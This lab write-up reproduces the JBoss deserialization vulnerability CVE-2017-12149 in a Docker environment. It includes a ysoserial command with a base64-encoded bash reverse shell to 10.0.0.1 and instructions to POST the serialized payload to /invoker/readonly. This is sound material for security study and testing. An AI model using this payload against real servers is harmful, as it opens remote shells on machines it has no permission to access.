# JBoss 5.x/6.x Deserialization Vulnerability (CVE-2017-12149)

The vulnerability is a Java deserialization error type that exists in the ReadOnlyAccessFilter filter in JBoss' HttpInvoker component. The filter attempts to deserialize the data stream from the client without any security checks, resulting in a vulnerability.

reference:

 - https://mp.weixin.qq.com/s/zUJMt9hdGoz1TEOKy2Cgdg
 - https://access.redhat.com/security/cve/cve-2017-12149

## test environment

Running the test environment

```
Docker-compose up -d
```

The first time you execute it, it will take 1~3 minutes to initialize. After the initialization is completed, you can see the JBoss default page by visiting `http://your-ip:8080/`.

## Vulnerability recurrence

The vulnerability appears in the `/invoker/readonly` request, and the server deserializes the user-submitted POST content:

![](img/1.png)

Therefore, we use the conventional Java deserialization vulnerability testing method to reproduce the vulnerability.

### Write a command to bounce the shell

We use bash to bounce the shell, but since `Runtime.getRuntime().exec()` can't use the methods needed by bash such as pipe, we need to do it once.

Tools: http://jackson.thuraisamy.me/runtime-exec-payloads.html

![](img/2.png)

### Serialized data generation

Use [ysoserial] (https://github.com/frohoff/ysoserial) to reproduce the generated serialized data. Since the Java version used by Vulhub is newer, the gadget selected for use is CommonsCollections5:

```
Java -jar ysoserial.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS8yMSAwPiYx}|{base64,-d}|{bash,-i}" > poc.ser
```

### Send POC

The generated POC is poc.ser. Send this file as POST Body to /invoker/readonly:

![](img/3.png)

Successfully bounced the shell:

![](img/4.png)